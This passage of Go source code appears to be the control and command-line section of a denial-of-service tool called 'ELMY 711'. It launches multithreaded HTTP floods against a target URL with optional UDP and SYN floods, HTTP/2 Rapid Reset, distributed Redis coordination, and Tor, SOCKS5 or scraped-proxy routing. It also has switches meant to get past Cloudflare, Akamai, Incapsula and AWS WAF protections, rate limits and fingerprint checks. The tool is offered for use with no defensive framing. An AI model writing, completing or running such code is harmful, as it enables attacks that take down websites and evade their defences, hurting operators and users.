	fmt.Printf("   ├─ Tor: %v\n", useTor)
	fmt.Printf("   ├─ SOCKS5: %v\n", useSOCKS5)
	fmt.Printf("   ├─ Cloudflare Bypass: %v\n", useCloudflare)
	fmt.Printf("   ├─ Akamai Bypass: %v\n", useAkamai)
	fmt.Printf("   ├─ Incapsula Bypass: %v\n", useIncapsula)
	fmt.Printf("   ├─ AWS WAF Bypass: %v\n", useAWSWAF)
	fmt.Printf("   ├─ Rate Limit Bypass: %v\n", useRatelimit)
	fmt.Printf("   ├─ Fingerprint Spoof: %v\n", useFingerprint)
	fmt.Printf("   └─ Referer Spoof: %v\n", useReferer)

	fmt.Printf("\n ELMY 711 STARTING ATTACK...\n")

	if useCloudflare {
		ae.cfSolver.Solve(targetURL)
	}
	if useAkamai {
		ae.akamai.Bypass(targetURL)
	}
	if useIncapsula {
		ae.incapsula.Bypass(targetURL)
	}
	if useAWSWAF {
		ae.awswaf.Bypass(targetURL)
	}

	if ae.proxyPool != nil {
		ae.proxyPool.ScrapeProxies()
		ae.proxyPool.FilterProxies()
	}

	for i := 0; i < threads; i++ {
		ae.wg.Add(1)
		go ae.worker()
	}

	if useUDP {
		go ae.attackUDP()
	}

	if useSYN {
		go ae.attackSYN()
	}

	go ae.statsPrinter()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-time.After(time.Duration(duration) * time.Second):
		fmt.Println("\n ⏰ Duration completed")
	case <-sigChan:
		fmt.Println("\n 📍 Stopped by user")
	}

	close(ae.stopChan)
	ae.wg.Wait()

	fmt.Printf("\n\n 🚀 ELMY 711 ATTACK FINISHED ☕☕☕ \n")
	fmt.Printf(" 📊 Total Sukses: %d\n", atomic.LoadUint64(&ae.stats.success))
	fmt.Printf(" 📊 Total Gagal: %d\n", atomic.LoadUint64(&ae.stats.failed))
	fmt.Printf(" 📊 Total Request: %d\n", atomic.LoadUint64(&ae.stats.total))

	ae.stats.mutex.RLock()
	fmt.Printf(" 📊 Status Codes:\n")
	for code, count := range ae.stats.statusCodes {
		fmt.Printf("   ├─ %d: %d\n", code, count)
	}
	ae.stats.mutex.RUnlock()
}

// ==================== MAIN ====================

func main() {
	flag.StringVar(&targetURL, "t", "", "Target URL")
	flag.IntVar(&threads, "c", 200, "Number of threads")
	flag.IntVar(&duration, "d", 600, "Duration in seconds")
	flag.IntVar(&payloadSize, "p", 2, "Payload size in MB")
	flag.BoolVar(&useHTTP2, "http2", false, "Enable HTTP/2 Rapid Reset")
	flag.BoolVar(&useUDP, "udp", false, "Enable UDP flood")
	flag.BoolVar(&useSYN, "syn", false, "Enable SYN flood (requires root)")
	flag.BoolVar(&useRedis, "redis", false, "Enable Redis distributed mode")
	flag.StringVar(&redisAddr, "redis-addr", "localhost:6379", "Redis address")
	flag.BoolVar(&useTor, "tor", false, "Route through Tor")
	flag.BoolVar(&useSOCKS5, "socks5", false, "Use SOCKS5 proxy")
	flag.StringVar(&socks5Addr, "socks5-addr", "", "SOCKS5 address (ip:port)")
	flag.StringVar(&proxyFile, "proxy-file", "", "Custom proxy file")
	flag.StringVar(&countryFilter, "country", "", "Filter proxy by country (US,EU,ASIA)")
	flag.BoolVar(&useCloudflare, "cloudflare", false, "Enable Cloudflare bypass")
	flag.BoolVar(&useAkamai, "akamai", false, "Enable Akamai bypass")
	flag.BoolVar(&useIncapsula, "incapsula", false, "Enable Incapsula bypass")
	flag.BoolVar(&useAWSWAF, "awswaf", false, "Enable AWS WAF bypass")
	flag.BoolVar(&useRatelimit, "ratelimit", false, "Enable rate limit bypass")
	flag.BoolVar(&useFingerprint, "fingerprint", false, "Enable fingerprint spoofing")
	flag.BoolVar(&useJA3, "ja3", false, "Enable JA3 spoofing")
	flag.BoolVar(&useReferer, "referer", false, "Enable referer spoofing")
	flag.BoolVar(&useAll, "all", false, "Enable ALL features")
	flag.BoolVar(&verbose, "v", false, "Verbose output")

	flag.Parse()

	if useAll {
		useHTTP2 = true
		useUDP = true
		useCloudflare = true
		useAkamai = true
		useIncapsula = true
		useAWSWAF = true
		useRatelimit = true
		useFingerprint = true
		useJA3 = true
		useReferer = true
		useTor = true
		useSOCKS5 = true
	}

	if targetURL == "" {
		fmt.Println("[ERROR] Target URL required")
		flag.Usage()
		os.Exit(1)
	}

	fmt.Print("\033[2J\033[;H")
	fmt.Println(BANNER)
	fmt.Println(" 🚀 ELMY 711  TOOLS 🚀\n")

	engine := NewAttackEngine()

	if useRedis {
		engine.redisClient = redis.NewClient(&redis.Options{
			Addr: redisAddr,
		})
		fmt.Printf(" ✅ Connected to Redis at %s\n", redisAddr)
	}

	engine.Start()
}
